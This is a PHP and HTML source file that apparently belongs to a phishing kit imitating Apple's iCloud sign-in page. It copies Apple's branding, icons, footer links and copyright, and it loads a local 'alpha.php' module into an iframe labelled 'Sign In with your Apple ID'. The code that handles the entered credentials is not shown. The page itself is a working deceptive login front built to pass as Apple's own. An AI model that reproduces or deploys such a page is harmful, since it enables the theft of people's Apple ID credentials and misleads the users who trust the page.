<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/apple.php");
	$module = "alpha.php";
?>

<!DOCTYPE html>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse" data-device-type-class="desktop">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="description" content="Log in to iCloud to access your photos, mail, notes, documents and more. Sign in with your Apple ID or create a new account to start using Apple services.">
    <meta name="keywords" content="icloud, free, apple">
    <meta name="og:title" content="iCloud.com">
    <meta name="og:image" content="https://www.icloud.com/icloud_logo/icloud_logo.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="google" content="notranslate">
    <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-120x120-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-152x152-precomposed.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/favicon-16x16.png">
    <link rel="mask-icon" sizes="any" color="#898989" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/safari-pinned-tab.svg">

    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>iCloud</title>
    <base href=".">
    <style id="cw-bootstrap-css">
      html {
        background-color: rgb(251, 251, 253);
      }

      #apple-logo,
      #gcbd-logo {
        margin-left: -2px;
        /* stylelint-disable-line */
      }

      html[dir="rtl"] #apple-logo,
      html[dir="rtl"] #gcbd-logo {
        margin-left: 0;
        /* stylelint-disable-line */
        margin-right: -2px;
        /* stylelint-disable-line */
      }

      #early-child.unclaimed {
        visibility: hidden;
      }

      #early-child {
        border: 0;
      }
    </style>
    <link rel="icon" href="https://www.icloud.com/favicon.ico">
    <style id="inert-style">
      [inert] {
        pointer-events: none;
        cursor: default;
      }

      [inert],
      [inert] * {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }
    </style>
	
    <link rel="stylesheet" type="text/css" href="script/icloud2024/css/2.main.css">
    <link rel="stylesheet" type="text/css" href="script/icloud2024/css/0.main.css">
	
	<script charset="utf-8" src="script/icloud2024/js/2.main.js"></script>
    <script charset="utf-8" src="script/icloud2024/js/0.main.js"></script>
	
    <link rel="preload" as="image" href="https://www.icloud.com/system/icloud.com/2404Project58/wallpaper.webp" type="image/webp">
    <style type="text/css"></style>
  </head>
  <body class="clicking">
    <div id="root">
      <ui-main-pane>
        <span class="screenreader-only-content" role="presentation">
          <div aria-live="polite" aria-relevant="additions" role="log"></div>
        </span>
        <div class="root-viewport">
          <div class="notification-presenter"></div>
          <div class="root-component">
            <div class="flex-page-viewport home-login-route fade-in">
              <div class="flex-page-content">
                <header class="cloudos-toolbar login overlay">
                  <div class="icloud-logo">
                    <a href="https://www.icloud.com/" aria-label="Navigate to icloud.com home page">
                      <img src ="script/icloud2024/img/header_logo.svg"/>
                    </a>
                  </div>
                  <div class="action-buttons">
                    <ui-button class="push primary help-menu-button icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-label="Help" aria-haspopup="menu">
                      <button type="button" tabindex="-1"></button>
                      <img src ="script/icloud2024/img/dot3.svg"/>
                    </ui-button>
                  </div>
                </header>
                <div class="home-login-component has-visible-quick-access">
                  <div class="parent-container has-visible-quick-access is-visible">
                    <div style="visibility: visible; height: auto;">
                      <div class="widget-icon-text">
                        <img class="icon" draggable="false" alt="" aria-hidden="true" src="script/icloud2024/img/logo.svg">
                      </div>
                      <div id="idms-auth-8e6ae69b-6830-44f7-b658-0cfb25fae676" class="apple-id-container no-sign-in-label">
                        <iframe src="<?=$module?>" width="100%" height="100%" id="aid-auth-widget-iFrame" name="aid-auth-widget" scrolling="no" frameborder="0" role="none" allow="publickey-credentials-get https://idmsa.apple.com" title="Sign In with your Apple ID"></iframe>
                      </div>
                      
					  
					  <div class="quick-access-container">
						  <div class="quick-access">
							<div class="quick-access-label"><?=$language['passcode_foot_label'][$lang];?></div>
							<div class="quick-access-buttons">
							  <div class="quick-access-button">
								<ui-button class="push primary icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button">
								  <button type="button" tabindex="-1"></button>
								  <svg viewBox="0 0 113.683837890625 111.1806640625" version="1.1" xmlns="http://www.w3.org/2000/svg" class=" layout-box" width="37">
									<g transform="matrix(1 0 0 1 -1.683129882812409 90.8203125)">
									  <path d="M8.72266-35.2606C8.72266-7.47784 31.3516 15.1511 59.1344 15.1511C86.9606 15.1511 109.59-7.47784 109.59-35.2606C109.59-50.7642 102.467-64.6827 91.3977-73.9726L87.465-67.3934C96.3507-59.5491 102.026-48.0686 102.026-35.2606C102.026-11.5985 82.7966 7.63087 59.1344 7.63087C35.5156 7.63087 16.2863-11.5985 16.2863-35.2606C16.2863-48.0686 21.9181-59.5491 30.8038-67.3934L26.9146-73.9726C15.8451-64.6827 8.72266-50.7642 8.72266-35.2606ZM25.0223-35.2606C25.0223-16.4104 40.3276-1.10512 59.1344-1.10512C77.9846-1.10512 93.2899-16.4104 93.2899-35.2606C93.2899-44.9063 89.2816-53.5323 82.864-59.7789L78.7988-52.9359C83.0601-48.2867 85.6766-42.0758 85.6766-35.2606C85.6766-20.6122 73.7828-8.71848 59.1344-8.71848C44.486-8.71848 32.5922-20.6122 32.5922-35.2606C32.5922-42.0758 35.2086-48.2867 39.5134-52.9359L35.4047-59.7789C29.0306-53.5323 25.0223-44.9063 25.0223-35.2606ZM41.1755-35.2709C41.1755-25.3573 49.2208-17.312 59.1344-17.312C69.048-17.312 77.1367-25.3573 77.1367-35.2709C77.1367-40.3835 74.9749-44.9589 71.5659-48.2212L88.1519-75.7173C88.3491-76.0494 88.2885-76.3695 87.9564-76.6204C79.8818-82.4204 69.3532-85.6724 59.1344-85.6724C48.9505-85.6724 38.387-82.4204 30.3558-76.6204C30.0237-76.3695 29.9631-76.0494 30.1603-75.7173L46.7463-48.2212C43.3373-44.9589 41.1755-40.3835 41.1755-35.2709ZM39.974-73.5699C45.726-76.4747 52.2276-78.1522 59.1344-78.1522C66.0412-78.1522 72.5428-76.4747 78.3382-73.5699L73.8098-66.0611C69.3474-68.2477 64.3481-69.4162 59.1344-69.4162C53.9207-69.4162 48.9214-68.2477 44.5024-66.0611ZM48.4728-59.5151C51.7005-61.0046 55.356-61.8028 59.1344-61.8028C62.9562-61.8028 66.6117-61.0046 69.8394-59.5151L65.3345-52.1213C63.414-52.8262 61.3356-53.2298 59.1344-53.2298C56.9766-53.2298 54.8983-52.8262 52.9343-52.1213ZM48.0558-35.2709C48.0558-41.4246 52.9807-46.3929 59.1344-46.3929C65.3315-46.3929 70.2564-41.4246 70.2564-35.2709C70.2564-29.1275 65.3213-24.1489 59.1344-24.1489C52.9909-24.1489 48.0558-29.1275 48.0558-35.2709ZM51.641-35.2709C51.641-31.1141 54.9879-27.7775 59.1344-27.7775C63.2912-27.7775 66.6278-31.1244 66.6278-35.2709C66.6278-39.4277 63.2809-42.7643 59.1344-42.7643C54.9776-42.7643 51.641-39.4175 51.641-35.2709Z"></path>
									</g>
								  </svg>
								  <div class="title"><?=$language['find_devices'][$lang];?></div>
								</ui-button>
							  </div>
							  <div class="quick-access-button">
								<ui-button class="push primary icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button">
								  <button type="button" tabindex="-1"></button>
								  <svg viewBox="0 0 145.67578125 111.1806640625" version="1.1" xmlns="http://www.w3.org/2000/svg" class=" layout-box" width="47">
									<g transform="matrix(1 0 0 1 -1.8170800781249454 90.8203125)">
									  <path d="M27.7789 9.76808L92.6089 9.76808C91.4587 8.13106 90.6086 6.17297 90.2453 3.95612C90.1724 3.29287 90.0996 2.62962 90.0785 1.86286L27.9035 1.86286C23.0272 1.86286 20.3144-0.694633 20.3144-5.77797L20.3144-64.5976C20.3144-69.6292 23.0272-72.2384 27.9035-72.2384L112.108-72.2384C116.942-72.2384 119.697-69.6292 119.697-64.5976L119.697-62.8481C122.518-62.8481 125.045-62.8481 127.551-62.8375L127.551-64.981C127.551-75.0367 122.465-80.1437 112.233-80.1437L27.7789-80.1437C17.5986-80.1437 12.4609-75.0578 12.4609-64.981L12.4609-5.3946C12.4609 4.6822 17.5986 9.76808 27.7789 9.76808ZM51.1572-1.87542L89.8474-1.87542C89.8474-3.34762 89.8474-4.89269 89.8474-6.37545L51.1572-6.37545C49.8508-6.37545 48.8761-5.50418 48.8761-4.09428C48.8761-2.73613 49.8508-1.87542 51.1572-1.87542ZM105.09 9.76808L127.288 9.76808C133.371 9.76808 136.847 6.40563 136.847 0.622849L136.847-47.9874C136.847-53.8219 133.36-57.1431 127.288-57.1431L105.09-57.1431C99.0077-57.1431 95.5417-53.8219 95.5417-47.9874L95.5417 0.622849C95.5417 6.40563 98.9971 9.76808 105.09 9.76808ZM105.205 3.36372C103.059 3.36372 101.946 2.19903 101.946-0.0393971L101.946-47.3663C101.946-49.6153 103.059-50.7388 105.205-50.7388L109.608-50.7388C109.784-50.7388 109.898-50.6247 109.898-50.4378L109.898-50.0228C109.898-48.3215 111.019-47.1703 112.731-47.1703L119.648-47.1703C121.36-47.1703 122.491-48.3215 122.491-50.0228L122.491-50.4378C122.491-50.6247 122.594-50.7388 122.749-50.7388L127.174-50.7388C129.361-50.7388 130.443-49.6153 130.443-47.3663L130.443-0.0393971C130.443 2.19903 129.361 3.36372 127.174 3.36372ZM109.532 0.871532L122.743 0.871532C123.749 0.871532 124.517 0.16608 124.517-0.840344C124.517-1.77391 123.739-2.50047 122.743-2.50047L109.532-2.50047C108.536-2.50047 107.872-1.77391 107.872-0.840344C107.872 0.217834 108.474 0.871532 109.532 0.871532Z"></path>
									</g>
								  </svg>
								  <div class="title"><?=$language['manage_devices'][$lang];?> <svg viewBox="0 0 268.0201416015625 158.116943359375" version="1.1" xmlns="http://www.w3.org/2000/svg" class="cloudos-menu-item-opens-in-new-tab layout-box" aria-hidden="true" style="height: 20.1966px; width: 34.2348px;">
									  <g transform="matrix(1 0 0 1 85.49510009765618 114.2884521484375)">
										<path d="M84.5703-17.334L84.5215-66.4551C84.5215-69.2383 82.7148-71.1914 79.7852-71.1914L30.6641-71.1914C27.9297-71.1914 26.0742-69.0918 26.0742-66.748C26.0742-64.4043 28.1738-62.4023 30.4688-62.4023L47.4609-62.4023L71.2891-63.1836L62.207-55.2246L13.8184-6.73828C12.9395-5.85938 12.4512-4.73633 12.4512-3.66211C12.4512-1.31836 14.5508 0.878906 16.9922 0.878906C18.1152 0.878906 19.1895 0.488281 20.0684-0.439453L68.5547-48.877L76.6113-58.0078L75.7324-35.2051L75.7324-17.1387C75.7324-14.8438 77.7344-12.6953 80.127-12.6953C82.4707-12.6953 84.5703-14.6973 84.5703-17.334Z"></path>
									  </g>
									</svg>
								  </div>
								</ui-button>
							  </div>
							</div>
						  </div>
					</div>
					  
					  
                    </div>
                  </div>
                </div>
                <footer>
                  <div class="legal-footer">
                    <div class="application-content">
                      <div class="legal-footer-content">
                        <div class="inner-row" role="presentation">
                          <div class="with-separator">
                            <a class="systemStatus" target="_blank" rel="noreferrer" href="https://www.apple.com/support/systemstatus/" aria-label="<?=$language['system_status'][$lang];?> (opens in a new tab)">
								<?=$language['system_status'][$lang];?>
							</a>
                            <div aria-hidden="true" class="separator"></div>
                          </div>
                          <div class="with-separator">
                            <a class="privacy" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/privacy/" aria-label="<?=$language['privacy'][$lang];?> (opens in a new tab)"><?=$language['privacy'][$lang];?></a>
                            <div aria-hidden="true" class="separator"></div>
                          </div>
                          <a class="terms" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/internet-services/icloud/" aria-label="<?=$language['terms'][$lang];?> (opens in a new tab)">
							<?=$language['terms'][$lang];?>
						  </a>
                        </div>
                        <div class="inner-row" role="presentation">
                          <span class="copyright">
							Copyright © <?=date('Y');?> Apple Inc. <?=$language['rights'][$lang];?>
						  </span>
                        </div>
                      </div>
                    </div>
                  </div>
                </footer>
              </div>
            </div>
          </div>
        </div>
      </ui-main-pane>
    </div>
    <link rel="stylesheet" href="script/icloud2024/css/main.css">
  </body>
</html>